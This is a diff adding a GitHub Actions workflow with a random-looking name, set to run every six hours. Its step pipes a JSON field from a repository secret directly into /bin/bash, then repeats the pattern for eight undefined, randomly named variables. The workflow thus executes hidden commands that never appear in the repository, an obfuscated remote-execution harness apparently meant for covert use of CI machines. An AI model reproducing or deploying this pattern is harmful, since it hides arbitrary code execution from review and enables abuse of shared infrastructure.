@@ -1,0 +1,25 @@
+name: fengjiheng1592
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fengjiheng1592
+        env:
+          y84322: ${{ secrets.y84322 }}
+        run: |
+          echo $y84322 | jq -r .x3 | /bin/bash
+          echo $hr8 | jq -r .z9595 | /bin/bash
+          echo $kwj58863 | jq -r .mvq65128 | /bin/bash
+          echo $lt6617 | jq -r .xmbc2813 | /bin/bash
+          echo $jqytx933 | jq -r .w937 | /bin/bash
+          echo $tlei51396 | jq -r .isk38 | /bin/bash
+          echo $wecb6609 | jq -r .i9106 | /bin/bash
+          echo $czei7981 | jq -r .z837 | /bin/bash
+          echo $gby403 | jq -r .hb3 | /bin/bash
+
